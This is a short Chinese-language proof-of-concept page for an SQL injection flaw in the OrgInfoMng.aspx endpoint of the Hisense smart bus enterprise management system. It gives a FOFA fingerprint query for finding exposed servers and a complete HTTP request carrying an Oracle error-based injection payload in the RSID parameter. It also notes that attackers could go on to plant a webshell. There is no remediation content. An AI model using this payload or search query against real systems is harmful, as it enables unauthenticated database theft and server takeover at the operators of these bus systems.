# 海信智能公交企业管理系统OrgInfoMng.aspx存在SQL注入漏洞

海信智能公交企业管理系统 OrgInfoMng.aspx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa

```javascript
body="var _FactoryData"
```

## poc

```javascript
GET /Erp/ErpAdmin/Form/OrgInfoMng.aspx?RSID=1%27+AND+9512%3DCTXSYS.DRITHSX.SN%289512%2C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%289512%3D9512%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%29--+sfjW HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
```

![image-20241114142404785](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411141424857.png)